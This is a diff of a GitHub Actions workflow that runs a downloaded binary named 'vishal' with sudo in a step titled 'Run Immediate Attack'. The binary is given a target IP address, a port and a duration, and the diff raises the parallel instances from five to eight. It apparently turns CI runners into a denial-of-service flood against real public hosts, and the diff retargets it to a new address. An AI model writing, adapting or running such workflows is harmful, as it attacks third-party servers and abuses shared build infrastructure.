@@ -9,7 +9,7 @@ jobs:
     timeout-minutes: 5
     strategy:
       matrix:
-        instance: [1, 2, 3, 4, 5]
+        instance: [1, 2, 3, 4, 5, 6, 7, 8]
     steps:
       - name: Download Binary (ULTRA FAST)
         run: |
@@ -17,5 +17,5 @@ jobs:
           chmod +x vishal
       
       - name: Run Immediate Attack
-        run: sudo ./vishal 20.204.188.47 10076 180 
+        run: sudo ./vishal 91.108.13.20 32003 60 
         continue-on-error: true
